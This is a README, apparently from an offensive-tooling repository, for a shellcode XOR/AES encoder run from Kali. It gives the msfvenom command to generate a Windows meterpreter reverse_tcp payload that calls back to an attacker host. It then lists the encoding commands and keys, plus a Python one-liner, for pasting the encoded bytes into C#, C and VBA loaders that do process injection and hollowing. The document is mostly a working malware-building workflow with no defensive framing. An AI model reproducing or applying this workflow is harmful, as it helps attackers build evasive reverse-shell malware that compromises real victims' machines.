# xor encoder

One file: `xor_encoder.py`. **Standalone prep tool — runs on Kali, not on the victim.**

This file is identical to `04-encoders/aes/shellcode_encoder.py`. Both support XOR and AES modes. The copy here is for convenience.

---

## xor_encoder.py

Reads a raw binary shellcode file and XOR-encodes it. Outputs a C#, C, or Python-formatted byte array ready to paste into your loader's `buf[]`.

**Install dependencies (first time):**
```bash
pip3 install pycryptodome pyscrypt
```

**Usage:**
```bash
python3 xor_encoder.py <shellcode_file> <key> <xor|aes> [--format <csharp|c|python>]
```

---

## Common workflows

### For C# loaders (simple-runner.cs, basic-injection.cs, hollow.cs, sections-runner.cs)

```bash
# Generate raw shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=thread -f raw -o shell.bin

# XOR encode with key 0xfa (the key used by all simple loaders in this repo)
python3 xor_encoder.py shell.bin 0xfa xor --format csharp

# Output goes to ./result/ — paste the byte array into buf[] in your loader
```

### For DLL_Runner.cs (key 0xAA)

```bash
python3 xor_encoder.py shell.bin 0xAA xor --format csharp
# Or the quick one-liner:
python3 -c "
data = open('shell.bin','rb').read()
enc  = bytes(b ^ 0xAA for b in data)
print(','.join(f'0x{b:02x}' for b in enc))
"
```

### For VBA macros (XorShellcodeRunner.vba, key 0xfa)

```bash
python3 xor_encoder.py shell.bin 0xfa xor --format vba
```

---

## Notes

- XOR with the same key is its own inverse — the decode loop in the loader is identical to the encode loop.
- Key `0xfa` (decimal 250) is used by `simple-runner.cs`, `basic-injection.cs`, `hollow.cs`, `simpleLoader.c`, `XorShellcodeRunner.vba`.
- Key `0xAA` (decimal 170) is used by `DLL_Runner.cs`, `DLL_Xor.cs`.
- For the AES-encrypted loaders (`clrunner.cs`, `clinject.cs`, `clhollow.cs`), use AES mode — see `04-encoders/aes/README.md`.
